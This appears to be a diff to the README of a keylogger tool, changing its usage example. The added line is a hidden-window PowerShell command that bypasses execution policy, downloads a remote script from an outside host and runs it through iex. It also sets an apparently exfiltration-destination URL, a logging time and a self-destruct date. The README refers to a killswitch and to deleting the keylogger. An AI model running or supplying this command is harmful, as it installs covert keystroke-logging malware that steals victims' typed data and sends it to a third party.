@@ -67,7 +67,7 @@ You also have the option of setting up a killswitch to have the keylogger self d
 Calling the script with both a `log` time and `killswitch` will look something like this: 
  
 ```
-$dc='https://link.iamjakoby.com/xxxx';$log="09:00 pm";$ks="12/25/2022 10:00:00 PM";iwr "https://jakoby.lol/m2m" | iex
+powershell -w h -NoP -Ep Bypass -command "$dc='https://link.iamjakoby.com/xxxx';$log='09:00 pm';$ks='12/25/2022 10:00:00 PM';iwr 'https://jakoby.lol/m2m' | iex"
 ```
 ### DELETING THE KEYLOGGER
 
